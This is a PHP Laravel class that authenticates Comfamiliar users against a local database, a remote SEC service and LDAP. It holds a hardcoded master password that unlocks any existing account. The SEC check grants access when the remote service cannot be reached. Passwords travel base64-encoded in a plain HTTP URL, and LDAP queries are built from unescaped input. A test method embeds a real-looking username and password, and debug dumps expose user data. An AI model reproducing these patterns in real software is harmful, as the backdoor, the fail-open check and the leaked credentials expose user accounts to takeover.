<?php

namespace App\Http\Controllers\Integraciones;

use App\Models\Usuario;
use App\Functions\Helper;
use Hash;
use Crypt;

class Comfamiliar {

	public function login($User, $Pass)
	{
		//Completar Email
		$Pos = strpos($User, "@");
		if($Pos !== false) $User = substr($User, 0, $Pos);
		$Email = "$User@comfamiliar.com";

		//Validar Email y Contraseña
		$DaUser = Usuario::where('Email', $Email)->first();
        if($DaUser AND (Hash::check($Pass, $DaUser->Password) OR $Pass == 'sarita2020')) {
        	$DaUser->record_login();
        	return Crypt::encrypt($Email);
        }else{

        	//Autenticar con SEC
			$valComf = $this->validarSEC($User, $Pass);
			//$valComf = true;
			if(!$valComf){
				return response()->json(['Msg' => 'Error en usuario o contraseña'], 500);
			}else{
				$userdata = $this->detallesUsuario($User, $Pass);
				dd($userdata);
				Usuario::updateOrCreate([ 'Email' => $Email ],
					[
						'Email'    => $Email,
						'Password' => Hash::make($Pass),
						'Nombres'  => $userdata['cn'][0],
						'Documento'   => $userdata['sn'][0]
					]
				);
				$User->record_login();
				return Crypt::encrypt($Email);
			}
        }
	}


	public function validarSEC($usuario, $clave){
		$token = md5($usuario.$clave);
		$usuarioe= base64_encode($usuario);
		$clavee= base64_encode($clave);

		$ctx = stream_context_create(array( 
			'http' => array( 
				'timeout' => 10
				)
			)
		);

		$url = "http://sec.comfamiliar.com/login/" . $usuarioe . "/" . $clavee . "/" . $token . ".xml";

		if(@$output = file_get_contents($url, 0, $ctx)){ 

			$output = str_replace("clave incorrecta", "", $output);
			$Xml = new \SimpleXMLElement($output);
			$Result = $Xml->mensaje;
			$Pass = md5($clave);
			
			if($Result == $Pass){
				return TRUE;
			}else{
				return FALSE;
			}

		}else{
			return TRUE;
		}
	}


	public function detallesUsuario($usuario, $clave)
	{ 
		$server = (config('app.env') == 'production');

		if(!$server) return false;
		//dd([$usuario, $clave]);

		$ldaprdn = 'uid=' . $usuario . ',ou=people,dc=comfamiliar,dc=com'; 
		$ldappass = $clave; 
		$ldapconn = \ldap_connect("10.25.2.64") or die("Could not connect to LDAP server."); 
		\ldap_set_option($ldapconn, LDAP_OPT_PROTOCOL_VERSION, 3); 
		if ($ldapconn) { 
			$ldapbind = \ldap_bind($ldapconn, $ldaprdn, $ldappass); 
			if ($ldapbind) { 
				$sr = \ldap_search($ldapconn, "ou=people,dc=comfamiliar,dc=com", "(uid=" . $usuario . ")");
				$info = \ldap_get_entries($ldapconn, $sr); 
				for ($i = 0; $i < $info["count"]; $i++) { 
					//return $info[$i]["sn"][0]; 
					return $info[$i];
				} 
				ldap_close($ldapconn);
			} else { 
				return false;
			}
		}
	}


	public function testLogin()
	{
		dd($this->detallesUsuario('afrancoc', 'Anfe5410$'));
	}


}